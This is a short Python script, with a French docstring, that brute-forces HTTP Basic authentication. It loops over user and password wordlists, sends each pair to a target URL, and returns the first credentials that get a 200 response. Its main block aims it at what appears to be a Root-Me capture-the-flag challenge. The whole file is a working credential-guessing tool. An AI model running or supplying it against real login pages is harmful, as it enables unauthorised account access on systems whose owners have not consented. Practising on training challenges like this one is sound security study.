"""
Script pour bruteforce une authentication basique HTTP
"""

import base64
import requests
import time
from models.progressBar import ProgressBar
from models.webRessource import headers_base as headers


def creds_is_valid(url, login, password):
    b64cred = base64.b64encode("{}:{}".format(login, password).encode()).decode()
    headers["Authorization"] = "Basic {}".format(b64cred)
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False


def bruteforce_basic_auth(url, user_wordlist, password_wordlist, tempo):
    x = 0
    with open(user_wordlist, 'r') as userFile:
        user_list = [x.strip() for x in userFile.readlines()]

    with open(password_wordlist, 'r') as passFile:
        pass_list = [x.strip() for x in passFile.readlines()]
    progBar = ProgressBar(len(user_list) * len(pass_list))
    for user in user_list:
        for password in pass_list:
            x += 1
            progBar.print_bar_progress(x)
            if creds_is_valid(url, user, password):
                print('\r', end="")
                return "{}:{}".format(user, password)
                break
            time.sleep(tempo)
            print('\r', end="")
    return "Not Found!"


if __name__ == "__main__":
    url = "http://challenge01.root-me.org/web-serveur/ch3/"
    # login = "admin"
    # password = "admin"
    # print(creds_is_valid(url, login, password))
    print(bruteforce_basic_auth(url, 'test_user.txt', 'test_pass.txt', 1))
